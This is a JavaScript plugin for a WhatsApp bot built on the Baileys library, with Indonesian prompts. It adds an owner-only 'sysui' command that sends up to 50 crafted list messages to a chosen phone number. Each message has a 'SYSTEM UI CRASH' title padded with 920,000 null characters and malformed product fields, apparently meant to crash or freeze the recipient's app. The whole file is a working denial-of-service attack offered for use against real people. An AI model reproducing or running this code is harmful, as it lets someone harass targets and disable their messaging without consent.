import {
    createRequire
} from 'module'
const require = createRequire(import.meta.url)
const { generateWAMessageFromContent, proto } = require('@adiwajshing/baileys');

async function sendListMessage(conn, jid) {
  try {
    // Generate the message content
    var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
      'listMessage': {
        'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(920000),
        'footerText': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
        'description': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': "lol",
            'products': [{
              'productId': "4392524570816732"
            }]
          }],
          'productListHeaderImage': {
            'productId': "4392524570816732",
            'jpegThumbnail': null
          },
          'businessOwnerJid': "0@s.whatsapp.net"
        }
      },
      'footer': "lol",
      'contextInfo': {
        'expiration': 600000,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), {
      'userJid': jid
    });

    // Relay the message
    await conn.relayMessage(jid, messageContent.message, {
      'participant': {
        'jid': jid
      },
      'messageId': messageContent.key.id
    });

  } catch (error) {
    console.error('Error in sendListMessage:', error);
    throw error; // Rethrow the error to handle it upstream
  }
}

let handler = async (m, { conn, text, command }) => {
  let [nomor, jumlah] = text.split('|');
  if (!nomor) throw `*Note : Masukan nomor yang akan di${command}, awali dengan kode negara*\n\n*Example : .${command} nomor|jumlah*\n*Contoh : .${command} 6281649357107|5*`;
  if (jumlah && isNaN(jumlah)) throw '*Note : Masukan jumlahnya*\n\n*Example : .${command} nomor|jumlah*\n*Contoh : .${command} 6281649357107|5*';

  let fixedNumber = nomor.replace(/[-+<>@]/g, '').replace(/ +/g, '').replace(/^[0]/g, '62') + '@s.whatsapp.net';
  let fixedJumlah = jumlah ? parseInt(jumlah) : 10;
  if (fixedJumlah > 50) throw 'Error!!, jumlah tidak boleh melebihi 50x️';

  await m.reply(`*Success* mengirim ${command} ke nomor : ${nomor}\n*Terkirim sebanyak : ${fixedJumlah} kali!*`);
  
  for (let i = fixedJumlah; i > 0; i--) {
    await sendListMessage(conn, fixedNumber); // Pass `conn` to the function
  }
};

handler.help = ['sysui'];
handler.tags = ['owner'];
handler.command = ['sysui'];
handler.group = false;
handler.owner = true;

export default handler;